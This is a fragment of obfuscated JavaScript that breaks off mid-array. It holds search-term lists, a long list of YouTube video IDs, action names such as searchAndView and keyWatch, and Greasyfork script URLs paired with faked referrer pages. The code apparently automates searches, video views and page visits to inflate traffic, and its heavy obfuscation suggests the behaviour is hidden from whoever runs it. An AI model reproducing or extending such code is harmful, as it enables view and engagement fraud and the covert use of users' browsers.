+ 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + Y(0x19) + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1e69 + -0x7c0 + 0x7 * 0x575)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x10b * 0x6 + -0x6a5 + -0xcf1 * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x12e5 + -0x572 * -0x2 + -0xc * -0xab);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    Z(0xb) + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    X(0xa, '!YgW') + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    X(0x1a, 'g*D%') + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + Y(0xc) + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x1c) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x1d, 'fyVg') + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + Z(0x1) + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
